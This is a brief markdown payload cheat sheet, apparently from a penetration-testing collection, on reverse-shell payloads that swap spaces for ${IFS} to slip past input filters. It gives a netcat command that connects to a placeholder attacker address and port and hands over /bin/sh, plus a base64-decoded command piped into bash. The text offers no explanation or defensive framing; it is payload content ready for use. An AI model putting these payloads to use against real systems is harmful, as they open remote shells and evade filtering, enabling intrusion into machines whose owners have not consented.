# Space Delimiter Reverse Shell Payload

## Payloads

### 1) Netcat

    nc${IFS}MY_IP${IFS}MY_PORT${IFS}-e${IFS}/bin/sh

### 2) Base64 encoded

    echo${IFS}BASE64_SHELL|base64${IFS}-d|bash
